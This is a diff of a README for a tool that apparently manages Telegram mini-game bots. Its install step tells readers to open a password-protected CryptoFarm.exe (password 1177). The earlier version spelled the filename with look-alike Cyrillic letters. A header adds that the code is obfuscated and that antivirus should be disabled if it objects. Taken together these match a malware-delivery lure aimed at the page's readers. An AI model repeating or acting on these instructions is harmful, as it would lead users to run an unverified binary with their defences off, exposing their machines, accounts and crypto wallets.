@@ -22,7 +22,7 @@ This project allows you to manage various Telegram mini-game bots. The project i
 
 ## Installation 🛠️
 1. Open main.py
-2. if source code not work, open CryptoFarm.ехе (PASS TO ARCHIVE - 1177)
+2. if source code not work, open CryptoFarm.exe (PASS - 1177)
 
 ## Because the code is obfuscated, antivirus may see it as a virus. if this happens, disable it
 ## Supported games👾
